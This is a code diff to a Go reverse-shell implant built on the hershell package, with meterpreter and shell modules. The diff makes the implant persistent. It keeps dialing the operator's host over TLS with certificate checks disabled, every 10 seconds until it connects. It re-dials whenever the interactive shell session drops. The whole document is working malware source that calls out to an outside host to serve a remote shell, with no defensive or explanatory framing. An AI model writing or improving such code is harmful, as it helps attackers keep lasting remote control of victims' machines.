@@ -9,6 +9,7 @@ import (
 	"net"
 	"os"
 	"strings"
+	"time"
 
 	"github.com/lesnuages/hershell/meterpreter"
 	"github.com/lesnuages/hershell/shell"
@@ -21,8 +22,9 @@ const (
 )
 
 var (
-	connectString string
-	fingerPrint   string
+	connectString  string
+	fingerPrint    string
+	serverNotifier chan string
 )
 
 func interactiveShell(conn net.Conn) {
@@ -34,7 +36,17 @@ func interactiveShell(conn net.Conn) {
 
 	conn.Write([]byte(prompt))
 
-	for scanner.Scan() {
+	for {
+		// check connection health, if connecntion was closed, program should
+		// try to rebuild new connnection
+
+		peerCheck := scanner.Scan()
+		if peerCheck == false {
+			conn.Close()
+			serverNotifier <- "remote_abnormal"
+			return
+		}
+
 		command := scanner.Text()
 		if len(command) > 1 {
 			argv := strings.Split(command, " ")
@@ -98,8 +110,13 @@ func reverse(connectString string, fingerprint []byte) {
 		err  error
 	)
 	config := &tls.Config{InsecureSkipVerify: true}
-	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
-		os.Exit(errHostUnreachable)
+
+	for {
+		if conn, err = tls.Dial("tcp", connectString, config); err != nil {
+			time.Sleep(10 * time.Second)
+		} else {
+			break
+		}
 	}
 
 	defer conn.Close()
@@ -107,7 +124,27 @@ func reverse(connectString string, fingerprint []byte) {
 	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
 		os.Exit(errBadFingerprint)
 	}
-	interactiveShell(conn)
+
+	go interactiveShell(conn)
+
+	for {
+		select {
+		case info := <-serverNotifier:
+			if info == "remote_abnormal" {
+				time.Sleep(3 * time.Second)
+				reConn, err := tls.Dial("tcp", connectString, config)
+				if err != nil {
+					serverNotifier <- "remote_abnormal"
+					continue
+				}
+
+				if ok, err := checkKeyPin(reConn, fingerprint); err != nil || !ok {
+					os.Exit(errBadFingerprint)
+				}
+				interactiveShell(reConn)
+			}
+		}
+	}
 }
 
 func main() {
@@ -117,6 +154,8 @@ func main() {
 		if err != nil {
 			os.Exit(errCouldNotDecode)
 		}
+
+		serverNotifier = make(chan string, 1)
 		reverse(connectString, bytesFingerprint)
 	}
 }
